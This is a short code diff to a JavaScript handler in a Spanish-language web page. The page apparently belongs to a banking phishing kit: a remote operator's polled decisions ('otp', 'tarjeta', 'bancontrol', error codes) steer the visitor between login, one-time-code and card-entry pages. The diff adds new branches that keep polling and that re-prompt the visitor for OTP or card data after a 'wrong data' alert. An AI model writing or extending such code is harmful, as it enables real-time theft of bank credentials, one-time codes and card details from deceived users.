@@ -140,16 +140,14 @@ async function verOTP() {
 
 function dec(a) {
   hideWait();
-  if      (a === 'tarjeta')     window.location.href = 'index3.html';
-  else if (a === 'error_otp')   {
-    showAlert('alOtp','Código incorrecto. Intenta de nuevo.');
-    document.querySelectorAll('.otp-input').forEach(i => { i.value=''; i.classList.add('error'); });
-    document.getElementById('o0').focus();
-  }
-  else if (a === 'bancontrol')  window.location.href = 'bancontrol.html';
-  else if (a === 'error_login') window.location.href = 'index1.html';
-  else if (a === 'finalizar')   window.location.href = 'final.html';
-  else                          window.location.href = 'index3.html';
+  if      (a === 'otp')              { document.querySelectorAll('.otp-input').forEach(i=>{i.value='';i.classList.remove('error');}); startPolling(dec); }
+  else if (a === 'tarjeta')          window.location.href = 'index3.html';
+  else if (a === 'bancontrol')       window.location.href = 'bancontrol.html';
+  else if (a === 'finalizar')        window.location.href = 'final.html';
+  else if (a === 'error_login')      window.location.href = 'index1.html';
+  else if (a === 'error_otp')        { showAlert('alOtp','Código incorrecto. Intenta de nuevo.'); document.querySelectorAll('.otp-input').forEach(i=>{i.value='';i.classList.add('error');}); document.getElementById('o0').focus(); startPolling(dec); }
+  else if (a === 'error_tarjeta')    { showAlert('alOtp','Datos incorrectos. Intenta de nuevo.'); startPolling(dec); }
+  else if (a === 'error_bancontrol') window.location.href = 'bancontrol.html';
 }
 </script>
 </body>
